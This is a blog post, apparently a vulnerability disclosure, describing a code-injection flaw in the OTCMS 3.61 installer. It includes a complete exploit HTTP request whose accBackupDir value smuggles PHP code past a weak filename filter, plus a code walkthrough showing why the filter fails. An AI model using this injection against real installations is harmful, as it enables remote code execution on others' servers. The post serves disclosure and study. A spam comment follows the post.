=== Content from xiaohuihui1.blogspot.com_4d6087f2_20250124_193834.html ===

[跳至主要内容](#main)

### 搜索此博客

# [xiaohuihui](https://xiaohuihui1.blogspot.com/)

### OTCMS 3.61 Command Execution

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[九月 18, 2018](https://xiaohuihui1.blogspot.com/2018/09/otcms-361-command-execution.html "permanent link")

## OTCMS 3.61 Command Execution

### Description

OTCMS 3.61 has caused code execution vulnerabilities during installation.

Affected parameters:   accBackupDir=a',phpinfo(),'a

Request Packet:

POST /OTCMS\_PHP\_V3.61\_20180806/install/index.php?mudi=run HTTP/1.1
Host: 192.168.159.148
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.159.148/OTCMS\_PHP\_V3.61\_20180806/install/index.php?mudi=config
Content-Type: application/x-www-form-urlencoded
Content-Length: 203
Cookie: qshZy\_userID=1; qshZy\_username=ss123; qshZy\_userInfo=AjsBD10hD39QMA9uWGoCDlNmUTRZZVY1UmIEMAcxCzgDMw44DDYBOlUxBWRbaAI1VzBQM1FrAGBRNFFkVGVROAJvATJdZg9uUGQPOFhsAjZTDFEPWQhWZlIvBDIHfgsw; qshZy\_usercall=ssssss; PHPSESSID=mubrngtpmvp2dvpuaoe7pkfgb0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

adminName=admin&adminPwd=admin&adminDir=admin&dbType=mysql&accName=&accDir=&sqlIp=localhost&sqlPo=3306&sqlUsername=root&sqlUserPwd=123.a&sqlDbName=OTCMS&sqlPref=OT\_&isImport=2&mysqlState=1&**accBackupDir=a',phpinfo(),'a**

visit homepage:

http://192.168.159.148/OTCMS\_PHP\_V3.61\_20180806/

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivz0mmAqKfnHOsLkywytPXrEtiigw_qeuK_CaTeWJmwGfr2nlc-oQButsRFvPtw0kZnI-CsDo-Z9JpdDf32W485LAUyB8gEyJ3t_m3Ag8Zzl-zB7Kn7mrD30xYfeIG8vDgjsTatY6oa18/s1600/Image.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivz0mmAqKfnHOsLkywytPXrEtiigw_qeuK_CaTeWJmwGfr2nlc-oQButsRFvPtw0kZnI-CsDo-Z9JpdDf32W485LAUyB8gEyJ3t_m3Ag8Zzl-zB7Kn7mrD30xYfeIG8vDgjsTatY6oa18/s1600/Image.png)

Code analysis

index.php

83 line： execute run()
    case 'run':
        WebTop();
      **run();**
        WebBottom();

        break;

862 line ： run()

function run(){
    global $DB,$dbServerName,$dbName;

    $adminName        = OT::PostStr('adminName');
    $adminPwd        = OT::PostStr('adminPwd');
    $adminDir        = OT::PostRegExpStr('adminDir','fileName');

    $isSkipChk        = OT::PostInt('isSkipChk');
    $dbType            = OT::PostStr('dbType');
    $accDir            = OT::PostRegExpStr('accDir','fileName');
    $accName        = OT::PostRegExpStr('accName','fileName');

    $sqlIp            = OT::PostStr('sqlIp');
    $sqlPo            = OT::PostInt('sqlPo');
    $sqlUsername    = OT::PostStr('sqlUsername');
    $sqlUserPwd        = OT::PostStr('sqlUserPwd');
    $sqlDbName        = OT::PostStr('sqlDbName');
    $sqlPref        = OT::PostStr('sqlPref');
    $isImport        = OT::PostInt('isImport');
    $isMysqlClass    = OT::PostInt('isMysqlClass');

   **$accBackupDir    = OT::PostRegExpStr('accBackupDir','fileName');**

OTCMS\_PHP\_V3.61\OTCMS\_PHP\_V3.61\_20180806\inc\classOT.php ： 55 line：

    public static function PostRegExpStr($str,$repType){
       **return Str::RegExp(@$\_POST[$str],$repType);**
    }

OTCMS\_PHP\_V3.61\OTCMS\_PHP\_V3.61\_20180806\inc\classStr.php: 276 line
case 'fileName':
 $pattern = "/(\\\\|\\/|\\:|\\\*|\\?|\\\"|<|>|\|)/i";
 return preg\_replace($pattern,'',$str);
 break;

**so bypass pattern**

[OTCMS](https://xiaohuihui1.blogspot.com/search/label/OTCMS)

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[yosabrams0918](https://www.blogger.com/profile/11140186761749280113)[2018年11月9日 02:20](https://xiaohuihui1.blogspot.com/2018/09/otcms-361-command-execution.html?showComment=1541758832841#c3435166117775907603)

   This web site is really a stroll-through for all the info you wished about this and didn’t know who to ask. Glimpse here, and also you’ll positively discover it. [best online casino](https://onlinecasino2018.us.org)

   回复[删除](https://www.blogger.com/delete-comment.g?blogID=7769232938385447779&postID=3435166117775907603)回复
   回复

添加评论加载更多...

#### 发表评论

[由 Blogger 提供支持](https://www.blogger.com)

主题背景图片创建者：[Michael Elkan](http://www.offset.com/photos/394244)

[Unknown](https://www.blogger.com/profile/17910414866837278780)

[访问个人资料](https://www.blogger.com/profile/17910414866837278780)

### 归档

* [九月 20181](https://xiaohuihui1.blogspot.com/2018/09/)

### 标签

* [OTCMS](https://xiaohuihui1.blogspot.com/search/label/OTCMS)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)


